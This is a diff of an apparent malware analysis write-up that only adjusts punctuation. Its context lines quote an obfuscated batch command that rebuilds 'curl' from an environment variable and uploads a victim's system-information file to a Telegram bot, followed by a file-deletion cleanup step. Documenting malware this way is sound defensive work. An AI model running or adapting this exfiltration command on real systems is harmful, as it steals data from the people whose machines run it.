@@ -145,7 +145,7 @@ Then it sends the file through Telegram. It posts `systeminfo.txt` to a specific
 c%public:~10,1%rl -s -X POST -F document=@"C:\Users\Public\%UserName%_systeminfo.txt" -F chat_id=-4043111076 https://api.telegram.org/bot6949120863:AAGX1W[REDACTED]/sendDocument --ssl-no-revoke 2>&1 >nul %MARIN%
 ```
 
-Last, it deletes the files it created: `systeminfo.txt`, `Kitagawa.js`, `wscript.exe`, `Kitagawa.bin`, and `Kitagawa.bat`.
+Last, it deletes the files it created, `systeminfo.txt`, `Kitagawa.js`, `wscript.exe`, `Kitagawa.bin`, and `Kitagawa.bat`.
 
 ```
 del "C:\Users\Public\%UserName%_systeminfo.txt" 2>&1 >nul %MARIN%
